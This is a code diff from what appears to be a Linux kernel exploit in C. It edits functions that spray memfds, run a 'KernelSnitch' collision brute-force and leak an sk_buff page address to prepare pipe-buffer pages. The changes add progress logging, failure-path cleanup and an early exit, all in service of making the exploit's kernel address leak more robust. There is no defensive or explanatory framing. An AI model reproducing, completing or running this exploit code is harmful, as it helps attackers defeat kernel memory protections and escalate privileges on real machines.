@@ -163,7 +163,11 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     spray.memfds[i] = clone_memfd();
   }
 
+  pr_info("pipe KernelSnitch setup begin\n");
+  fflush(NULL);
   setup_kernelsnitch();
+  pr_info("pipe KernelSnitch setup complete\n");
+  fflush(NULL);
 
   for (size_t i = 0; i < pre.mm_cnt; i++) {
     pre.childs[i] = -1;
@@ -189,6 +193,17 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
 
   if (!kernelsnitch_collisions_ready()) {
     pr_error("pipe KernelSnitch collision finding failed\n");
+    cleanup_kernelsnitch();
+    close(leak_memfd);
+    close_ctx_memfds(&prep);
+    close_ctx_memfds(&spray);
+    close_ctx_memfds(&pre);
+    close_ctx_memfds(&post);
+    free_ctx_storage(&prep);
+    free_ctx_storage(&spray);
+    free_ctx_storage(&pre);
+    free_ctx_storage(&post);
+    return 0;
   }
 
   unsigned char *buf = malloc(SKB_SEND_SIZE);
@@ -238,10 +253,26 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   SYSCHK(close(leak_memfd));
   SYSCHK(sendmsg(skb_sv[0], &msg, 0));
 
+  pr_info("pipe KernelSnitch bruteforce begin\n");
+  fflush(NULL);
   run_kernelsnitch_bruteforce();
+  pr_info("pipe KernelSnitch cleanup begin\n");
+  fflush(NULL);
   uintptr_t leaked = cleanup_kernelsnitch();
   if (leaked == (uintptr_t)-1) {
     pr_error("pipe KernelSnitch sk_buff page leak failed\n");
+    close(skb_sv[0]);
+    close(skb_sv[1]);
+    close_ctx_memfds(&prep);
+    close_ctx_memfds(&spray);
+    close_ctx_memfds(&pre);
+    close_ctx_memfds(&post);
+    free_ctx_storage(&prep);
+    free_ctx_storage(&spray);
+    free_ctx_storage(&pre);
+    free_ctx_storage(&post);
+    free(buf);
+    return 0;
   }
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
@@ -315,6 +346,9 @@ uintptr_t prepare_pipe_buffer_page(void) {
       pipe_fds_drain[i][1] = -1;
     }
     SYSCHK(write(result_pipe[1], &base, sizeof(base)));
+    if (!base) {
+      _exit(1);
+    }
     for (;;) {
       sleep(60);
     }
